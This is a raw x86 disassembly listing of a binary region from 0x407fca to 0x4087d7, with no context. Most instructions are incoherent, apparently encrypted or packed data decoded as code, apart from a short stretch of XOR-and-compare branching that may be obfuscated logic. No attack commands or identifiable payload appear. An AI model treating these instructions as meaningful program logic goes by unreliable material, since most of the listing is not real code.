  407fca:	stos   BYTE PTR es:[edi],al
  407fcb:	lds    eax,FWORD PTR [eax-0x2867f287]
  407fd1:	xlat   BYTE PTR ds:[ebx]
  407fd2:	sub    ebx,0x233f009a
  407fd8:	sub    BYTE PTR [ebp+edx*2-0x31b37fbc],0xbf
  407fe0:	dec    edi
  407fe1:	and    edx,DWORD PTR [edi]
  407fe3:	call   0x463bcc6a
  407fe8:	and    BYTE PTR [ebp-0x3f],ah
  407feb:	mov    esp,0x6342ff45
  407ff0:	add    eax,0x2df0226a
  407ff5:	sub    BYTE PTR [ebx],ch
  407ff7:	in     eax,dx
  407ff8:	idiv   dl
  407ffa:	adc    edi,DWORD PTR [ecx]
  407ffc:	inc    esi
  407ffd:	fadd   QWORD PTR [ebx+eax*4+0x62c3d236]
  408004:	in     al,dx
  408005:	pop    ecx
  408006:	mov    ecx,0x659f351
  40800b:	adc    edx,esp
  40800d:	bound  ebp,QWORD PTR [ebp+0x66]
  408010:	cmp    DWORD PTR [eax],esp
  408012:	xor    esp,edx
  408014:	jmp    0x46e8:0xa517045b
  40801b:	add    al,0xe0
  40801d:	mov    al,0xd0
  40801f:	scas   al,BYTE PTR es:[edi]
  408020:	(bad)  
  408021:	out    dx,al
  408022:	loopne 0x40809c
  408024:	xchg   esp,eax
  408025:	jmp    0x21c2b8e0
  40802a:	lahf   
  40802b:	and    BYTE PTR [edi+0x4add2bf0],0x2b
  408032:	lods   eax,DWORD PTR ds:[esi]
  408033:	test   BYTE PTR [esi+ecx*2],ch
  408036:	push   ebx
  408037:	mov    ecx,0xed5b57a8
  40803c:	ret    
  40803d:	popf   
  40803e:	add    edx,DWORD PTR [edi-0x229ccc09]
  408044:	fdiv   DWORD PTR [edx-0x69]
  408047:	pop    es
  408048:	mov    ebx,0xee0b1002
  40804d:	inc    ebx
  40804e:	jns    0x408086
  408050:	jb     0x4080c8
  408052:	xchg   esi,eax
  408053:	lds    ebx,FWORD PTR [ebp-0x5c]
  408056:	mov    eax,ds:0xdb653c2a
  40805b:	fiadd  DWORD PTR [edi]
  40805d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40805e:	xlat   BYTE PTR ds:[ebx]
  40805f:	mov    bh,0x3e
  408061:	cs and al,0xfe
  408064:	test   DWORD PTR ds:0xc93333fe,ebx
  40806a:	(bad)  
  40806b:	jge    0x408048
  40806d:	ret    0xd19b
  408070:	pushf  
  408071:	add    edx,eax
  408073:	scas   al,BYTE PTR es:[edi]
  408074:	cwde   
  408075:	pop    ebp
  408076:	lahf   
  408077:	push   eax
  408078:	scas   eax,DWORD PTR es:[edi]
  408079:	push   esi
  40807a:	leave  
  40807b:	into   
  40807c:	xchg   ecx,eax
  40807d:	hlt    
  40807e:	dec    ebx
  40807f:	mov    BYTE PTR [edx],bh
  408081:	xor    esi,DWORD PTR [ebx-0x31939b12]
  408087:	stos   BYTE PTR es:[edi],al
  408088:	push   edx
  408089:	(bad)  
  40808a:	mov    esi,0xdfe4ab60
  40808f:	lahf   
  408090:	jmp    0x408097
  408092:	mov    eax,0x5cd4c42e
  408097:	push   esp
  408098:	or     al,0xd8
  40809a:	lock or al,0xb3
  40809d:	lock mov DWORD PTR [edx+0x5],ecx
  4080a1:	jne    0x40804c
  4080a3:	test   eax,0x53b8f3d6
  4080a8:	adc    DWORD PTR [edx],ecx
  4080aa:	sub    esp,eax
  4080ac:	enter  0x79cc,0xe1
  4080b0:	cmc    
  4080b1:	cmc    
  4080b2:	scas   al,BYTE PTR es:[edi]
  4080b3:	jp     0x408106
  4080b5:	cld    
  4080b6:	xor    BYTE PTR [ebx+esi*8+0x8],bl
  4080ba:	and    eax,0x7c6ef84
  4080bf:	sub    esp,edx
  4080c1:	fdiv   st,st(1)
  4080c3:	push   es
  4080c4:	dec    ebx
  4080c5:	inc    edi
  4080c6:	adc    eax,0x7da18004
  4080cb:	cdq    
  4080cc:	mov    dl,0xe4
  4080ce:	push   eax
  4080cf:	sbb    ax,0x6219
  4080d3:	iret   
  4080d4:	es (bad) 
  4080d6:	jle    0x408106
  4080d8:	out    dx,eax
  4080d9:	sub    eax,0xb76b4ba1
  4080de:	xchg   ebx,eax
  4080df:	sbb    BYTE PTR [esi+edx*2+0x32],bh
  4080e3:	jmp    0x40810f
  4080e5:	std    
  4080e6:	jnp    0x408105
  4080e8:	mov    eax,ds:0x92ac1fa
  4080ed:	shr    DWORD PTR [esi],0xb5
  4080f0:	jno    0x408149
  4080f2:	sbb    al,0x4
  4080f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080f5:	mov    al,ds:0xccd0a61b
  4080fa:	retf   
  4080fb:	dec    esi
  4080fc:	aaa    
  4080fd:	mov    BYTE PTR [esi],cl
  4080ff:	(bad)
  408103:	pushf  
  408104:	cmp    dh,BYTE PTR ds:0x7c720c4f
  40810a:	retf   
  40810b:	jmp    0x5530:0xccd18440
  408112:	std    
  408113:	rcr    esp,0xe6
  408116:	add    DWORD PTR [ebx-0x6b],esp
  408119:	test   DWORD PTR [ecx-0x12],eax
  40811c:	cmp    ebp,DWORD PTR [ecx+eax*8+0x5f]
  408120:	leave  
  408121:	add    DWORD PTR [eax],edi
  408123:	call   0xc902c5a1
  408128:	mov    eax,ds:0xbb830c98
  40812d:	push   ecx
  40812e:	daa    
  40812f:	(bad)  
  408130:	in     al,dx
  408131:	sbb    cl,BYTE PTR [ecx]
  408133:	std    
  408134:	sbb    edx,esi
  408136:	mov    al,ds:0x6a61460a
  40813b:	mov    al,ds:0xe0663b3a
  408140:	test   eax,0x5e1e1ced
  408145:	mov    cl,0x2c
  408147:	or     edx,DWORD PTR [edx]
  408149:	retf   
  40814a:	sub    DWORD PTR [esi-0x15edf581],eax
  408150:	jg     0x40810b
  408152:	xchg   ecx,eax
  408153:	(bad)  
  408154:	mov    eax,cs:0x58426869
  40815a:	fimul  WORD PTR [esi-0x4a7a9d92]
  408160:	push   esp
  408161:	mov    gs,WORD PTR [esi]
  408163:	cmp    eax,0x35ae4e37
  408168:	aas    
  408169:	hlt    
  40816a:	inc    ebp
  40816b:	mov    ebp,0x42bfeb11
  408170:	mov    eax,ds:0xd691d2ab
  408175:	jnp    0x408128
  408177:	adc    DWORD PTR [edi+edx*8+0x633966cc],edi
  40817e:	push   es
  40817f:	outs   dx,BYTE PTR ds:[esi]
  408180:	add    BYTE PTR [esi+edx*2-0x61],0x80
  408185:	and    edx,edx
  408187:	lock aas 
  408189:	aas    
  40818a:	xchg   ecx,eax
  40818b:	repnz loopne 0x4081ac
  40818e:	lea    ebx,[eax]
  408190:	inc    ecx
  408191:	sbb    al,0x56
  408193:	in     eax,0xd
  408195:	call   0xe3e3:0x96ecbd55
  40819c:	jmp    0x40814c
  40819e:	int    0x7e
  4081a0:	jns    0x40812f
  4081a2:	adc    BYTE PTR [ecx],cl
  4081a4:	rol    BYTE PTR [ebp-0x2f],0x51
  4081a8:	fsubr  st(7),st
  4081aa:	dec    edx
  4081ab:	dec    ebp
  4081ac:	int    0x95
  4081ae:	(bad)  
  4081af:	pop    esi
  4081b0:	mov    eax,0x1128f2ec
  4081b5:	jecxz  0x40816e
  4081b7:	pop    eax
  4081b8:	xor    DWORD PTR [ebx+0x53],eax
  4081bb:	cld    
  4081bc:	xor    DWORD PTR [eax+0x24],0x5e7bff3f
  4081c3:	cld    
  4081c4:	jns    0x40816e
  4081c6:	xchg   ebp,eax
  4081c7:	jmp    0x9782:0xfdc33dca
  4081ce:	xor    eax,0xae15087a
  4081d3:	aaa    
  4081d4:	mov    ds:0xc66eff39,eax
  4081d9:	jbe    0x40823b
  4081db:	push   ss
  4081dc:	push   ss
  4081dd:	repz mov ah,BYTE PTR [edx]
  4081e0:	sbb    DWORD PTR [edx+0x7e64f8ec],edx
  4081e6:	dec    esp
  4081e7:	js     0x408173
  4081e9:	xor    DWORD PTR [edx-0x7d],0x24
  4081ed:	add    al,0xd3
  4081ef:	mov    al,0x15
  4081f1:	stos   DWORD PTR es:[edi],eax
  4081f2:	sti    
  4081f3:	or     BYTE PTR [edi],bl
  4081f5:	jo     0x40821f
  4081f7:	out    0xd7,eax
  4081f9:	scas   al,BYTE PTR es:[edi]
  4081fa:	fprem  
  4081fc:	inc    ecx
  4081fd:	push   esi
  4081fe:	jmp    0x591d1497
  408203:	imul   edi,DWORD PTR [esi-0x6f098acc],0x7
  40820a:	loop   0x4081db
  40820c:	mov    dl,0x39
  40820e:	out    0xf7,al
  408210:	xchg   DWORD PTR [ebx+0x6],esi
  408213:	mov    dh,0xb1
  408215:	aaa    
  408216:	add    al,0x10
  408218:	pop    edx
  408219:	mov    eax,0x657d33d3
  40821e:	sti    
  40821f:	lds    eax,FWORD PTR [edx]
  408221:	push   0xbfc77932
  408226:	pusha  
  408227:	mov    bh,0xd0
  408229:	imul   ecx,DWORD PTR [esi],0xc0dea7a8
  40822f:	out    dx,al
  408230:	(bad)  
  408231:	or     eax,0x242261b7
  408236:	sbb    esi,0x29
  408239:	xchg   esi,eax
  40823a:	call   0x93f5c5de
  40823f:	jne    0x408227
  408241:	or     BYTE PTR [ecx-0x1c5391fb],ah
  408247:	lock fwait
  408249:	xor    edi,esp
  40824b:	inc    ecx
  40824d:	mov    bh,0xfb
  40824f:	sub    edx,DWORD PTR [ecx-0x769ce4b2]
  408255:	mov    ah,0xbe
  408257:	sahf   
  408258:	bnd jp 0x408233
  40825b:	adc    DWORD PTR [edi-0x37],eax
  40825e:	dec    esp
  40825f:	mov    cl,cl
  408261:	add    edx,0xffffffcc
  408264:	icebp  
  408265:	push   ss
  408266:	mov    al,0xaa
  408268:	push   esi
  408269:	retf   0xa87b
  40826c:	inc    ecx
  40826d:	pop    esi
  40826e:	imul   ebp,DWORD PTR [esi],0xc089b910
  408274:	add    al,0xb0
  408276:	dec    esp
  408277:	fiadd  WORD PTR [eax+0x78]
  40827a:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40827c:	jo     0x408201
  40827e:	jnp    0x408270
  408280:	dec    ebx
  408281:	push   ds
  408282:	cwde   
  408283:	aam    0xbb
  408285:	and    edi,DWORD PTR [ebx]
  408287:	jle    0x408250
  408289:	lods   al,BYTE PTR ds:[esi]
  40828a:	jp     0x4082f4
  40828c:	inc    esp
  40828d:	mov    eax,ds:0xaad621b3
  408292:	mov    BYTE PTR [edi-0xcc5365b],ch
  408298:	mov    edi,0x1304a8f3
  40829d:	sti    
  40829e:	cmp    eax,0x9b333fc1
  4082a3:	js     0x408311
  4082a5:	jg     0x408305
  4082a7:	aaa    
  4082a8:	into   
  4082a9:	sub    eax,0x50fe5090
  4082ae:	pushf  
  4082af:	(bad)  
  4082b0:	pop    ebx
  4082b1:	sbb    esi,ebx
  4082b3:	mov    edi,0xf3129721
  4082b8:	fisub  DWORD PTR [eax+0x4d50cf90]
  4082be:	adc    al,0xb6
  4082c0:	stc    
  4082c1:	das    
  4082c2:	in     eax,dx
  4082c3:	jp     0x40829b
  4082c5:	int    0xd2
  4082c7:	push   esi
  4082c8:	mov    dl,BYTE PTR [ecx]
  4082ca:	sbb    BYTE PTR [esi-0x6a12b377],al
  4082d0:	int3   
  4082d1:	jo     0x408311
  4082d3:	mov    cs,WORD PTR [ebx+ecx*4-0x39cc37bb]
  4082da:	add    eax,edi
  4082dc:	mov    DWORD PTR [ebp-0x8],eax
  4082df:	mov    DWORD PTR [ebp-0x2c],0xf89c8590
  4082e6:	mov    DWORD PTR [ebp-0x44],0xf89c85bf
  4082ed:	mov    eax,DWORD PTR [ebp-0x38]
  4082f0:	mov    edx,DWORD PTR [ebp-0x14]
  4082f3:	xor    eax,esi
  4082f5:	add    eax,edi
  4082f7:	cmp    edx,eax
  4082f9:	je     0x40cbaa
  4082ff:	mov    eax,DWORD PTR [ebp-0x20]
  408302:	xor    eax,esi
  408304:	mov    edx,0xffcd8d14
  408309:	sub    edx,eax
  40830b:	add    edx,DWORD PTR [ebp-0x14]
  40830e:	mov    eax,DWORD PTR [ebp-0x20]
  408311:	mov    ebx,DWORD PTR [ebp-0x10]
  408314:	xor    eax,esi
  408316:	add    eax,edi
  408318:	imul   eax,ebx
  40831b:	cmp    eax,edx
  40831d:	ja     0x40cba7
  408323:	jmp    0x40a67f
  408328:	iret   
  408329:	xor    ecx,DWORD PTR [esi-0x3c7071c1]
  40832f:	add    DWORD PTR [ebx],0xfffffff7
  408332:	adc    edx,ebx
  408334:	xor    esi,esp
  408336:	fiadd  DWORD PTR [eax+0x7a7a15b9]
  40833c:	cmp    ebx,DWORD PTR [edi+0x7a]
  40833f:	jp     0x40836e
  408341:	mov    ch,0x61
  408343:	adc    ah,BYTE PTR ds:0x851870f5
  408349:	js     0x4082d5
  40834b:	and    eax,0xb520bf93
  408350:	mov    esp,0x70a6d7f5
  408355:	mov    ah,0x14
  408357:	outs   dx,DWORD PTR ds:[esi]
  408358:	cs add bh,bl
  40835b:	sbb    ebp,DWORD PTR [ebx-0x79235c19]
  408361:	jl     0x40834a
  408363:	inc    edi
  408364:	aad    0xa
  408366:	setne  BYTE PTR [ebx]
  408369:	adc    eax,0xdb9d7436
  40836e:	push   0xffffff81
  408370:	fimul  DWORD PTR [edi+0x5]
  408373:	test   BYTE PTR [eax+edx*1-0x32d78980],dl
  40837a:	sbb    DWORD PTR [ebp+0x354cae0d],eax
  408380:	mov    esi,0x63cbdde2
  408385:	in     eax,dx
  408386:	int3   
  408387:	cmp    edx,ebp
  408389:	scas   al,BYTE PTR es:[edi]
  40838a:	and    al,0x42
  40838c:	call   0x81373861
  408391:	outs   dx,BYTE PTR ds:[esi]
  408392:	ja     0x408413
  408394:	sbb    ah,BYTE PTR [eax]
  408396:	in     eax,0xaa
  408398:	lahf   
  408399:	mov    ebp,0xa12e3d8a
  40839e:	mov    eax,DWORD PTR [ecx]
  4083a0:	xor    eax,0x34e257a3
  4083a5:	fwait
  4083a6:	mov    al,ds:0x9b8d060c
  4083ab:	ror    DWORD PTR [ecx-0x419be73a],1
  4083b1:	push   ss
  4083b2:	in     al,dx
  4083b3:	inc    ebx
  4083b4:	call   0x1ed5:0x975d6d
  4083bb:	pop    ecx
  4083bc:	ja     0x40839c
  4083be:	aaa    
  4083bf:	add    eax,0x9743169c
  4083c4:	xchg   ecx,eax
  4083c5:	cld    
  4083c6:	adc    eax,0xd252e908
  4083cb:	adc    eax,0x5c4ecd
  4083d0:	pop    edx
  4083d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083d2:	addr16 data16 jnp 0x40838b
  4083d6:	mov    edi,0xf6375000
  4083db:	aas    
  4083dc:	into   
  4083dd:	scas   al,BYTE PTR es:[edi]
  4083de:	ret    
  4083df:	jmp    0xcb275c25
  4083e4:	mov    al,ds:0x632f8b8e
  4083e9:	cmc    
  4083ea:	repnz sahf 
  4083ec:	and    eax,0xf835a7ac
  4083f1:	lock jle 0x408379
  4083f4:	sub    eax,0xd9ae0abd
  4083f9:	aaa    
  4083fa:	push   edx
  4083fb:	push   ds
  4083fc:	daa    
  4083fd:	or     edx,ecx
  4083ff:	sbb    al,BYTE PTR [ecx]
  408401:	or     al,0x98
  408403:	(bad)  
  408404:	sti    
  408405:	xchg   ebx,eax
  408406:	sub    ah,BYTE PTR [ecx-0x4d]
  408409:	mov    edx,DWORD PTR [edx+0x4019b311]
  40840f:	hlt    
  408410:	push   0x1f
  408412:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408413:	mov    al,0xa1
  408415:	push   esp
  408416:	icebp  
  408417:	fbld   TBYTE PTR [eax-0x1f]
  40841a:	cmp    dl,BYTE PTR [eax-0x40a3a924]
  408420:	mov    ecx,0xeb8d6c5d
  408425:	pop    ebx
  408426:	je     0x4083cb
  408428:	jmp    0x4083e1
  40842a:	mov    dl,0x51
  40842c:	out    0xde,eax
  40842e:	sti    
  40842f:	push   ebp
  408430:	mov    ss,eax
  408432:	xchg   BYTE PTR [edx],bh
  408434:	dec    ecx
  408435:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  408437:	add    eax,0xc1208894
  40843c:	pop    ds
  40843d:	(bad)  
  40843e:	fs loop 0x408413
  408441:	std    
  408442:	int3   
  408443:	lds    esp,FWORD PTR [eax]
  408445:	(bad)  
  408446:	xor    bl,ch
  408448:	inc    esp
  408449:	xchg   esp,eax
  40844a:	cmp    eax,0x4bc250e6
  40844f:	call   0x6735fb43
  408454:	push   ds
  408455:	mov    ds:0x3c5a2a10,al
  40845a:	mov    ch,0x7b
  40845c:	cdq    
  40845d:	dec    esp
  40845e:	pushf  
  40845f:	adc    BYTE PTR [edi],0x81
  408462:	cld    
  408463:	mov    cl,0x19
  408465:	sbb    BYTE PTR [ecx+0x4af23359],bl
  40846b:	call   0xb73033
  408470:	stos   BYTE PTR es:[edi],al
  408471:	outs   dx,BYTE PTR ds:[esi]
  408472:	fdivr  DWORD PTR [edx+eax*1-0x27c721f]
  408479:	jp     0x40848f
  40847b:	sbb    bh,al
  40847d:	ja     0x408402
  40847f:	mov    ebp,0x7f0bf18a
  408484:	push   0xffffffd5
  408486:	or     edi,0xffffff95
  408489:	cli    
  40848a:	test   al,0xae
  40848c:	(bad)  
  40848e:	xchg   ebp,eax
  40848f:	(bad)  
  408490:	sbb    DWORD PTR [ecx+0x65d75072],esi
  408496:	sub    al,0x65
  408498:	lds    ebp,FWORD PTR [esi]
  40849a:	pop    eax
  40849b:	inc    esi
  40849c:	adc    al,0xbd
  40849e:	lea    ecx,[esi]
  4084a0:	bound  eax,QWORD PTR [ecx-0x2e]
  4084a3:	jne    0x408503
  4084a5:	mov    edx,0x362d49db
  4084aa:	push   esi
  4084ab:	popf   
  4084ac:	fcom   QWORD PTR [eax+eax*1+0x503de8b6]
  4084b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4084b4:	inc    edi
  4084b5:	mov    esp,0x901c1ca7
  4084ba:	pushf  
  4084bb:	xor    dl,BYTE PTR [esi]
  4084bd:	jne    0x408460
  4084bf:	mov    eax,ds:0x25f4b0d
  4084c4:	xchg   edx,eax
  4084c5:	mov    ecx,0xe366652c
  4084ca:	inc    edx
  4084cb:	loop   0x4084e1
  4084cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4084ce:	(bad)  
  4084cf:	jge    0x408506
  4084d1:	fstp   QWORD PTR [ecx-0x778defae]
  4084d7:	not    DWORD PTR [edx]
  4084d9:	push   cs
  4084da:	adc    al,0x86
  4084dc:	fs push ebx
  4084de:	fldenv [ebx-0x4b]
  4084e1:	inc    edx
  4084e2:	loope  0x40853a
  4084e4:	cmp    al,0x96
  4084e6:	push   es
  4084e7:	pop    esp
  4084e8:	mov    eax,ds:0xfda26f48
  4084ed:	mov    ah,0x9e
  4084ef:	dec    eax
  4084f0:	daa    
  4084f1:	dec    esi
  4084f2:	enter  0x4bf5,0x5
  4084f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084f7:	mov    BYTE PTR [eax+0x2ef45bec],ah
  4084fd:	das    
  4084fe:	add    cl,BYTE PTR ds:0xe39032d8
  408504:	jo     0x40848b
  408506:	retf   0xfd6
  408509:	push   ebp
  40850a:	mov    cl,0xe8
  40850c:	push   ebp
  40850d:	lea    ebx,[ebx]
  40850f:	xor    al,0x5c
  408511:	cld    
  408512:	jmp    0x40855b
  408514:	jmp    0xe92b:0xd21aea90
  40851b:	jge    0x408523
  40851d:	adc    eax,0x40da8fd5
  408522:	mov    bh,0xfc
  408524:	int    0x2b
  408526:	mov    ah,BYTE PTR [esi]
  408528:	mov    ebx,0x70159de3
  40852d:	sbb    edi,DWORD PTR [eax-0x6d27f192]
  408533:	sbb    eax,DWORD PTR [ebx+edi*4-0x1e]
  408537:	stos   DWORD PTR es:[edi],eax
  408538:	ret    
  408539:	pop    edx
  40853a:	lods   al,BYTE PTR ds:[esi]
  40853b:	imul   ebx,DWORD PTR [ebp+0x51],0xe34f5e5
  408542:	fistp  WORD PTR [ebx+0x533380f0]
  408548:	sbb    eax,0x15b3f51d
  40854d:	mov    ebx,0xb501db17
  408552:	cli    
  408553:	pop    ss
  408554:	xor    ebx,DWORD PTR [ecx+0x25e67ec]
  40855a:	jp     0x4084f1
  40855c:	repz xor DWORD PTR [ebp+ecx*4-0xf],ebp
  408561:	jne    0x4084e8
  408563:	div    bl
  408565:	mov    ebp,0x790ea1ee
  40856a:	shr    ah,cl
  40856c:	jb     0x4085ba
  40856e:	add    ecx,DWORD PTR [eax]
  408570:	std    
  408571:	sub    ecx,DWORD PTR [ebp-0x12d39daa]
  408577:	pcmpeqd mm1,QWORD PTR [ecx+0x79016df]
  40857e:	push   ss
  40857f:	and    al,0xc9
  408581:	lods   eax,DWORD PTR ds:[esi]
  408582:	and    esp,DWORD PTR [esi+ebx*1-0x4961d29b]
  408589:	xchg   esp,eax
  40858a:	and    ecx,DWORD PTR [eax+0x55]
  40858d:	dec    ebx
  40858f:	xor    dh,cl
  408591:	dec    ecx
  408592:	inc    ebx
  408593:	loop   0x4085db
  408595:	mov    al,ds:0xea1ce7ef
  40859a:	fsubr  QWORD PTR [edi]
  40859c:	mov    edi,DWORD PTR [eax]
  40859e:	loope  0x408616
  4085a0:	jg     0x408568
  4085a2:	cmc    
  4085a3:	push   ebp
  4085a4:	mov    esp,0x468a1efe
  4085a9:	adc    BYTE PTR [ebx-0x4a20049f],dl
  4085af:	fld    QWORD PTR [edx-0x75f69c92]
  4085b5:	xchg   edx,eax
  4085b6:	inc    edi
  4085b7:	mov    ch,0x6
  4085b9:	or     DWORD PTR [edx+esi*8-0x3aeac69f],esp
  4085c0:	cmp    edx,DWORD PTR [eax]
  4085c2:	sub    BYTE PTR [edi+0x1258ac81],0xd
  4085c9:	fdiv   st,st(5)
  4085cb:	jg     0x4085c8
  4085cd:	out    dx,eax
  4085ce:	out    0x34,al
  4085d0:	mov    BYTE PTR [edx],0x8b
  4085d3:	push   ebx
  4085d4:	push   edx
  4085d5:	iret   
  4085d6:	cmp    eax,0xb95b6d79
  4085db:	sub    al,0xb9
  4085dd:	and    DWORD PTR [edi-0x59],ebx
  4085e0:	in     al,0x6b
  4085e2:	int3   
  4085e3:	dec    ecx
  4085e4:	clc    
  4085e5:	mov    eax,ds:0x44a13a2c
  4085ea:	and    al,0x5a
  4085ec:	fist   WORD PTR [esi+0x7f]
  4085ef:	ss stos BYTE PTR es:[edi],al
  4085f1:	int3   
  4085f2:	shr    dh,1
  4085f4:	loope  0x4085b7
  4085f6:	ins    BYTE PTR es:[edi],dx
  4085f7:	push   ecx
  4085f8:	mov    cs,WORD PTR [eax-0x40]
  4085fb:	jmp    0x408646
  4085fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085fe:	inc    esi
  4085ff:	div    BYTE PTR [esi]
  408601:	in     eax,dx
  408602:	sbb    eax,0xab8dd69
  408607:	and    BYTE PTR [eax+0x2a],0x83
  40860b:	mov    esp,0x2fb6d267
  408610:	imul   edx,DWORD PTR ds:0x5fe8a163,0x52
  408617:	add    edx,DWORD PTR [esi-0x49076601]
  40861d:	int    0x5e
  40861f:	popf   
  408620:	aad    0x72
  408622:	xor    bh,BYTE PTR [edx+0x6d]
  408625:	loop   0x4086a4
  408627:	js     0x40868c
  408629:	jae    0x408643
  40862b:	mov    dl,0x8f
  40862d:	mov    al,0xf8
  40862f:	es into 
  408631:	stos   BYTE PTR es:[edi],al
  408632:	fsub   QWORD PTR [edx+0x543b29d9]
  408638:	xchg   esi,eax
  408639:	aad    0x81
  40863b:	fst    DWORD PTR [edx+0x38]
  40863e:	dec    ecx
  40863f:	lods   eax,DWORD PTR ds:[esi]
  408640:	push   esi
  408641:	add    ecx,esp
  408643:	inc    ecx
  408644:	xchg   edi,eax
  408645:	cmp    DWORD PTR [ebx],0xcba9a9e9
  40864b:	int3   
  40864c:	pop    edi
  40864d:	mov    bl,ah
  40864f:	inc    esi
  408650:	mov    ebx,0x84f369cc
  408655:	ins    BYTE PTR es:[edi],dx
  408656:	dec    edi
  408657:	jo     0x408655
  408659:	or     bl,BYTE PTR [ebp+0x3c]
  40865c:	cmp    al,0x6a
  40865e:	adc    cl,bh
  408660:	je     0x4085e6
  408662:	lock pop edi
  408664:	cmp    edx,DWORD PTR [ebp-0x574a4177]
  40866a:	xchg   edi,edx
  40866c:	ins    BYTE PTR es:[edi],dx
  40866d:	cli    
  40866e:	hlt    
  40866f:	(bad)  
  408671:	push   0xd44cd5e6
  408676:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408677:	fwait
  408678:	mov    ecx,DWORD PTR [esi+0x3a]
  40867b:	jecxz  0x408628
  40867d:	jl     0x408664
  40867f:	cmp    ebx,DWORD PTR [ebx]
  408681:	(bad)  
  408682:	mov    bl,0x80
  408684:	dec    esp
  408685:	adc    DWORD PTR [eax-0x4618cd19],edx
  40868b:	mov    ecx,0x3e8cbb24
  408690:	es push ebx
  408692:	pop    DWORD PTR [edx]
  408694:	loopne 0x40870c
  408696:	cmp    eax,0xa90f260e
  40869b:	ins    DWORD PTR es:[edi],dx
  40869c:	jno    0x408698
  40869e:	add    al,0xcd
  4086a0:	(bad)  
  4086a1:	adc    al,0x57
  4086a3:	fild   DWORD PTR [edx+eax*2-0x2c9c5d99]
  4086aa:	mov    al,bl
  4086ac:	icebp  
  4086ad:	call   0xe2321284
  4086b2:	add    DWORD PTR [edx+0x3268dd40],eax
  4086b8:	adc    eax,0x637cff1b
  4086bd:	sub    al,0x12
  4086bf:	push   edx
  4086c0:	mov    dh,BYTE PTR [edi-0x2b02476a]
  4086c6:	push   esi
  4086c7:	je     0x408663
  4086c9:	inc    ecx
  4086ca:	repnz aam 0x33
  4086cd:	stos   DWORD PTR es:[edi],eax
  4086ce:	mov    ebx,DWORD PTR [ecx+0x779a3401]
  4086d4:	mov    dl,0xeb
  4086d6:	and    ecx,ebx
  4086d8:	and    BYTE PTR [ebp+0x671e4cfc],al
  4086de:	imul   al
  4086e0:	popf   
  4086e1:	adc    bl,BYTE PTR [edi-0x3c62a5c7]
  4086e7:	add    eax,0xf0d51566
  4086ec:	lods   al,BYTE PTR ds:[esi]
  4086ed:	je     0x4086cf
  4086ef:	cld    
  4086f0:	std    
  4086f1:	ins    DWORD PTR es:[edi],dx
  4086f2:	xchg   esi,eax
  4086f3:	repz xor bh,ch
  4086f6:	int    0x2b
  4086f8:	aad    0xb6
  4086fa:	test   BYTE PTR [eax],0xcc
  4086fd:	outs   dx,DWORD PTR ds:[esi]
  4086fe:	jp     0x4086bf
  408700:	scas   eax,DWORD PTR es:[edi]
  408701:	and    eax,0x4d2a8ce0
  408706:	mov    esi,0xea60a50a
  40870b:	jmp    0x40870a
  40870d:	jmp    0xb6bb3621
  408712:	jg     0x4086b8
  408714:	xchg   edx,eax
  408715:	nop
  408716:	sub    ecx,esi
  408718:	fmul   st,st(1)
  40871a:	push   edx
  40871b:	test   DWORD PTR [ecx],edx
  40871d:	inc    ecx
  40871e:	sbb    dh,ch
  408720:	out    0x2,eax
  408722:	pop    ss
  408723:	enter  0xc543,0x76
  408727:	add    dh,BYTE PTR [ebx+0x48e6523a]
  40872d:	in     eax,dx
  40872e:	xor    DWORD PTR [ecx+0x14e37c01],ecx
  408734:	mul    DWORD PTR [ebx+0x3ee34ef4]
  40873a:	lds    ebp,FWORD PTR [ebp-0x63ec6158]
  408740:	call   0x6e3e7904
  408745:	jp     0x40877d
  408747:	es jp  0x40878c
  40874a:	mov    dl,0x36
  40874c:	mov    bl,0xf9
  40874e:	(bad)  
  408750:	ficomp DWORD PTR [edx]
  408752:	mov    bh,0x34
  408754:	jmp    0x40878e
  408756:	sbb    BYTE PTR [ebx-0x43],ah
  408759:	fild   WORD PTR [edx+0x62]
  40875c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40875d:	push   DWORD PTR [edi-0x6d]
  408760:	or     ebp,DWORD PTR [eax+0x69]
  408763:	pop    eax
  408764:	iret   
  408765:	outs   dx,DWORD PTR ds:[esi]
  408766:	stc    
  408767:	pop    ds
  408768:	push   esi
  408769:	imul   esi,DWORD PTR [ebp-0x76f152ac],0xffffffed
  408770:	add    eax,0xc6e2d8f2
  408775:	xchg   ecx,eax
  408776:	repnz mov cl,BYTE PTR [edx-0x12]
  40877a:	jge    0x4087e7
  40877c:	mov    edi,0x73218605
  408781:	js     0x4087ec
  408783:	jnp    0x408795
  408785:	jl     0x40873b
  408787:	xchg   DWORD PTR [edx-0x7d],ebx
  40878a:	std    
  40878b:	int    0xf5
  40878d:	scas   al,BYTE PTR es:[edi]
  40878e:	mov    ds,WORD PTR [ebx+0x2638fd3b]
  408794:	popf   
  408795:	in     al,dx
  408796:	comiss xmm3,DWORD PTR [ebx-0x6815c7be]
  40879d:	(bad)  
  40879e:	sti    
  40879f:	mov    DWORD PTR [edx],edi
  4087a1:	js     0x4087f7
  4087a3:	sbb    BYTE PTR [ecx+0x22],ch
  4087a6:	mov    al,0xac
  4087a8:	sub    al,0x2f
  4087aa:	shl    BYTE PTR [ecx-0x129b3baf],0x6b
  4087b1:	mov    ds:0x8f8c2489,al
  4087b6:	ins    BYTE PTR es:[edi],dx
  4087b7:	fisttp QWORD PTR [ebp+ebp*4+0x21]
  4087bb:	inc    edx
  4087bc:	xor    BYTE PTR [esi+0x2275600e],0xf7
  4087c3:	lahf   
  4087c4:	xchg   BYTE PTR [edx+0x535c5a0b],ah
  4087ca:	fwait
  4087cb:	out    dx,al
  4087cc:	(bad)  
  4087cd:	inc    edx
  4087ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087cf:	out    dx,al
  4087d0:	sbb    DWORD PTR [ecx-0x562382ee],eax
  4087d6:	dec    ecx
  4087d7:	out    dx,al
